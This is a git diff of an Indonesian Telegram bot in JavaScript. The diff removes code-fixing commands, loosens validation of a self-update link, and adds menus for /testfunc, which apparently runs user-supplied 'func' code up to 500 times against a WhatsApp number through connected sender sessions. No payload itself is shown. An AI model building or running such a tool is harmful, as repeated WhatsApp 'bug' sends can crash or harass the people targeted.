-Atau reply ke file .js</blockquote>`,
-      { parse_mode: "HTML" })
-  }
-
-  if (!code) return ctx.reply("Kode kosong.")
-
-  const loading = await ctx.reply("Menganalisa dan memperbaiki kode...")
-  const before                     = analyseCode(code)
-  const { fixed, fixNotes, result } = tryAutoFix(code)
-  const success                    = !result.hasError
-
-  await ctx.telegram.deleteMessage(ctx.chat.id, loading.message_id).catch(() => {})
-
-  if (success) {
-    const out =
-`HASIL FIX ERROR — BERHASIL
-───────────────────────────
-Error Awal : ${before.errorMsg || "—"}
-Baris      : ${before.errorLine ? `Baris ke-${before.errorLine}` : "Tidak terdeteksi"}
-Saran      : ${before.fixSuggest || "—"}
-Fix        : ${fixNotes.join(" | ") || "Auto-fixed"}
-───────────────────────────
-
-SEBELUM (dengan anotasi error):
-
-${before.annotated}
-
-───────────────────────────
-
-SESUDAH (kode diperbaiki):
-
-${renderAnnotated(fixed, null)}`
-
-    await ctx.reply(`<pre>${esc(out)}</pre>`, { parse_mode: "HTML" })
-
-    const tmp = path.join(BASE_DIR, `fixed_${Date.now()}.js`)
-    fs.writeFileSync(tmp, fixed)
-    await ctx.replyWithDocument({ source: tmp, filename: "fixed_code.js" }, { caption: "File .js hasil perbaikan otomatis" })
-    fs.unlinkSync(tmp)
-  } else {
-    const out =
-`<blockquote>HASIL FIX ERROR — GAGAL DIPERBAIKI OTOMATIS
-───────────────────────────
-Error  : ${result.errorMsg}
-Baris  : ${result.errorLine ? `Baris ke-${result.errorLine}` : "Tidak terdeteksi"}
-Saran  : ${result.fixSuggest}
-───────────────────────────
-
-KODE + ANOTASI:
-
-${result.annotated}</blockquote>`
-
-    await ctx.reply(`<pre>${esc(out)}</pre>`, { parse_mode: "HTML" })
-  }
-});
-
-bot.command("cleancode", async ctx => {
-
-  const rep = ctx.message.reply_to_message
-  let code  = ""
-
-  if (rep?.document?.file_name?.endsWith(".js")) {
-    try { code = await downloadTgFile(ctx.telegram, rep.document.file_id) }
-    catch (e) { return ctx.reply(`Gagal download file: ${e.message}`) }
-  } else if (rep?.text) {
-    code = rep.text.trim()
-  } else {
-    return ctx.reply(
-`<blockquote><b>Cara pakai /cleancode</b>
-
-Reply ke pesan berisi kode JavaScript,
-lalu ketik /cleancode
-
-Atau reply ke file .js</blockquote>`,
-      { parse_mode: "HTML" })
-  }
-
-  if (!code) return ctx.reply("Kode kosong.")
-
-  const loading = await ctx.reply("Merapikan kode...")
-  const cleaned = cleanCode(code)
-  await ctx.telegram.deleteMessage(ctx.chat.id, loading.message_id).catch(() => {})
-
-  const out = `HASIL CLEAN CODE\n${"─".repeat(27)}\n\n${cleaned}`
-  await ctx.reply(`<pre>${esc(out)}</pre>`, { parse_mode: "HTML" })
-
-  const tmp = path.join(BASE_DIR, `clean_${Date.now()}.js`)
-  fs.writeFileSync(tmp, cleaned)
-  await ctx.replyWithDocument({ source: tmp, filename: "clean_code.js" }, { caption: "File .js hasil Clean Code" })
-  fs.unlinkSync(tmp)
-});
+})
 
 bot.command("cekupdate", async (ctx) => {
 
@@ -2821,157 +1472,212 @@ bot.command("setlinkupdate", async (ctx) => {
     if (
         Number(ctx.from.id) !==
         Number(config.OWNER_ID)
-    ) {
-
-        return ctx.reply(
-            "<b>❌ Khusus Owner</b>",
-            {
-                parse_mode: "HTML"
-            }
-        )
-
-    }
+    ) return
 
     WAITING_UPDATE_LINK[
         ctx.from.id
     ] = true
 
     await ctx.reply(
+        "Kirim link raw.github untuk update"
+    )
 
-`
-<blockquote><b>Kirim link raw.github untuk update</b></blockquote>
-<blockquote><b>Contoh</b>: <code>https://raw.githubusercontent.com/user/repo/main/index.js</code></blockquote>
-`,
-{
-parse_mode: "HTML"
-}
-)
-
-}
-
-)
+})
 
 bot.on(
-"text",
-async (ctx, next) => {
+    "text",
+    async (ctx, next) => {
 
-    const userId =
-        Number(ctx.from.id)
+        const userId =
+            Number(ctx.from.id)
 
-    if (
-        !WAITING_UPDATE_LINK[
+        if (
+            !WAITING_UPDATE_LINK[
+                userId
+            ]
+        ) {
+            return next()
+        }
+
+        delete WAITING_UPDATE_LINK[
             userId
         ]
-    ) {
-        return next()
-    }
 
-    const newLink =
-        ctx.message.text.trim()
+        const newLink =
+            ctx.message.text.trim()
 
-    if (
-        !newLink.startsWith(
-            "https://raw.githubusercontent.com/"
-        )
-    ) {
+        await updateLink
+            .setUpdateLink(
+                ctx,
+                newLink
+            )
 
-        return ctx.reply(
-            "❌ Link raw github tidak valid."
-        )
-
-    }
-
-    delete WAITING_UPDATE_LINK[
-        userId
-    ]
-
-    const processMsg =
         await ctx.reply(
-            "<blockquote><b>📥 Link Diterima.</b></blockquote>",
+            "✅ Link berhasil diubah"
+        )
+
+    }
+)
+
+// Action Bot
+bot.action("test_func", onlyJoinChannel, async (ctx) => {
+  const userId = ctx.from.id;
+  
+  const userSocks =
+    userSessions.get(userId) || new Map()
+    
+  const activeSenders =
+    [...userSocks.keys()]
+    .filter(id =>
+        senderStatus.get(id)
+    )
+
+  const senderCount =
+    activeSenders.length
+
+  const senderStatusText =
+    senderCount > 0
+        ? `✅ ᴀᴄᴛɪᴠᴇ (${senderCount} sender)`
+        : `❌ ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇɴᴅᴇʀ`;
+        
+        const runtime = getBotRuntime();
+        const memory = getMemoryUsage();
+
+        await ctx.answerCbQuery()
+
+        await ctx.editMessageCaption(
+`<blockquote>╭───▢ ɪɴғᴏʀᴍᴀᴛɪᴏɴ sᴛᴀᴛᴜs ▢───╮
+├─▢ ʀᴜɴᴛɪᴍᴇ : ${runtime}
+├─▢ ᴍᴇᴍᴏʀʏ : ${memory}
+├─▢ sᴇɴᴅᴇʀ sᴛᴀᴛᴜs : ${senderStatusText}
+├─▢ ᴘʀᴇғɪx : /
+├─▢ sʏsᴛᴇᴍ : ғʀᴇᴇ ᴀᴄᴄᴇss
+╰───────────────────────╯</blockquote>
+<blockquote expandable>
+╭─────▢ ᴄᴏᴍᴍᴀɴᴅ ʟɪsᴛ ▢───╮
+│
+├─▢ /testfunc 62xx 10
+│        ╰┈⪼ (reply teks/file js)     
+├─▢ /cekerror 
+│        ╰┈⪼ (reply teks/file js)
+├─▢ /connect 
+│        ╰┈⪼ ᴛᴀᴍʙᴀʜ sᴇɴᴅᴇʀ  
+├─▢ /disconnect 
+│        ╰┈⪼ ʀᴇᴍᴏᴠᴇ sᴇɴᴅᴇʀ 
+├─▢ /listsender 
+│        ╰┈⪼ ʟɪᴀᴛ sᴇɴᴅᴇʀ
+├─▢  /status
+│         ╰┈≫ ᴄʜᴇᴄᴋ sᴛᴀᴛᴜs
+╰────────────────────╯</blockquote>`,
             {
-                parse_mode: "HTML"
+                parse_mode: "HTML",
+                reply_markup: keyboard2
             }
         )
 
+    }
+)
+
+bot.action("tutor_menu", onlyJoinChannel, async (ctx) => {
+
+        await ctx.answerCbQuery()
+
+        await ctx.editMessageCaption(
+`<blockquote><b>𝖳𝖴𝖳𝖮𝖱𝖨𝖠𝖫 𝖯𝖠𝖪𝖠𝖨</b></blockquote>
+<blockquote expandable><b>▢ /testfunc Reply Func/file.js berisi func,
+Pastikan Sudah memiliki sender/sesssion,
+lalu ketik /testfunc sambil reply func/file.js dan masukan loop nya contoh : /testfunc (reply) 10
+maksimal 1-500 loop</b></blockquote>
+<blockquote expandable><b>▢ /cekerror [ Reply func/file.js/code ]
+Contoh : /cekerror (reply)
+bot akan menganalisis dan memberu tahu yang mana yang error.</b></blockquote>
+<blockquote expandable><b>▢ /connect [ No ]
+Contoh : /connect 62xxx atau kirim cmd /connect dahulu baru nomor nya.
+Bisa menggunakan nomor negara apa saja.</b></blockquote>
+<blockquote expandable><b>▢ /disconnect [ No ]
+Contoh : /disconnect 62xxx 
+fungsi untuk menghapus sender/session.</b></blockquote>
+<blockquote><b>▢ /listsender
+Fungsi untuk melihat list sender anda.</b></blockquote>`,
+            {
+                parse_mode: "HTML",
+                reply_markup: keyboard2
+            }
+        )
+
+    }
+)
+
+bot.action("main_menu", async (ctx) => {
+
+        const runtime = getBotRuntime();
+        const memory = getMemoryUsage();
+
+        const menuText = `
+<blockquote>𝖮𝗅𝖺𝖺. ${ctx.from.first_name}  𝖨𝗇 𝖡𝗈𝗍 𝖳𝖾𝗌𝗍𝖥𝗎𝗇𝖼</blockquote>
+<blockquote>╭──────▢ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ▢─────╮
+├─▢ 👑 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @SabilOfficial
+├─▢ 🤖 ᴠᴇʀsɪᴏɴ : 𝟣 𝖦𝖾𝗇 𝟤
+├─▢ 💎 ʟᴀɴɢᴜᴀɢᴇ : 𝖩𝖺𝗏𝖺𝖲𝖼𝗋𝗂𝗉t
+├─▢ 🛡 ᴘʀᴇғɪx : /
+├─▢ ⏳ ʀᴜɴᴛɪᴍᴇ : ${runtime}
+╰───────────────────────╯</blockquote>
+<blockquote><b>⪻┅ 𝖯𝗋𝖾𝗌𝗌 𝖡𝗎𝗍𝗍𝗈𝗇 ┅⪼</b></blockquote>
+`;
+        await ctx.editMessageCaption(menuText, {
+            parse_mode: "HTML",
+            reply_markup: keyboard1
+        });
+});
+// ==================== RESTORE SESSIONS ====================
+async function restoreSessions() {
+    const activeSenders = loadActiveSenders();
+    if (!activeSenders.length) {
+        console.log('✅ Tidak ada sesi WA untuk di-restore.');
+        return;
+    }
+    console.log(`🔄 Restoring ${activeSenders.length} sesi WhatsApp...`);
+    for (const { sender, userId } of activeSenders) {
+        console.log(`  ↳ Connecting: ${sender} (user: ${userId})`);
+        await connectSingle(sender, userId);
+        await sleep(800);
+    }
+}
+
+
+// ==================== JALANKAN BOT ====================
+// =============================
+// DELETE CACHE FOLDER
+// =============================
+restoreSessions()
+.then(async () => {
+
     try {
 
-        let indexCode =
-            fs.readFileSync(
-                "./index.js",
-                "utf8"
-            )
+        await bot.telegram.getMe()
 
-        indexCode =
-            indexCode.replace(
-                /const\s+UPDATE_URL\s*=\s*["'`].*?["'`]/,
-                `const UPDATE_URL = "${newLink}"`
-            )
+        await bot.launch()
 
-        fs.writeFileSync(
-            "./index.js",
-            indexCode,
-            "utf8"
-        )
-
-        await ctx.telegram
-        .deleteMessage(
-            processMsg.chat.id,
-            processMsg.message_id
-        )
-        .catch(() => {})
-
-        const successMsg =
-            await ctx.reply(
-                "<b>✅ Link Berhasil Diubah</b>",
-                {
-                    parse_mode: "HTML"
-                }
-            )
-
-        setTimeout(
-            async () => {
-
-                await ctx.telegram
-                .deleteMessage(
-                    successMsg.chat.id,
-                    successMsg.message_id
-                )
-                .catch(() => {})
-
-            },
-            3000
+        console.log(
+            '✅ Bot Telegram berjalan'
         )
 
     } catch (err) {
 
-        await ctx.telegram
-        .deleteMessage(
-            processMsg.chat.id,
-            processMsg.message_id
+        console.log(
+            '❌ Telegram Error:',
+            err.message
         )
-        .catch(() => {})
 
-        await ctx.reply(
-
-`
-<blockquote><b>❌ Gagal Mengubah Link</b></blockquote>
-<code>${err.message}</code>
-`,
-{
-parse_mode: "HTML"
-}
-)
+        setTimeout(
+            () => process.exit(1),
+            5000
+        )
 
     }
 
-}
-
-)
-// kontol up
-// ==================== JALANKAN ====================
-// =============================
-// DELETE CACHE FOLDER
-// =============================
+})
+.catch(console.error)
 const foldersToDelete = [
 
     ".npm",
@@ -3150,12 +1856,12 @@ async function sendBackup(
             },
             {
                 caption:
-`
-<blockquote><b>📦 SYSTEM BACKUP</b></blockquote>
-<blockquote><b>📝 Reason : ${reason}</b></blockquote>
-<blockquote><b>🕒 Time : ${time}</b></blockquote>
+`\`\`\`js
+📦 SYSTEM BACKUP
+📝 Reason : ${reason}
+🕒 Time : ${time}\`\`\`
 `,
-                parse_mode: "HTML"
+                parse_mode: "Markdown"
             }
         )
 
@@ -3234,19 +1940,5 @@ watcher.on(
 console.log(
     `[ AUTO BACKUP SYSTEM ACTIVE ]`
 );
-
-bot.launch().then(() => console.log('✅ Bot obfuscator berjalan'));
-setTimeout(
-    async () => {
-
-        await updater
-        .sendUpdateNotification(
-            bot,
-            config
-        )
-
-    },
-    3000
-)
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
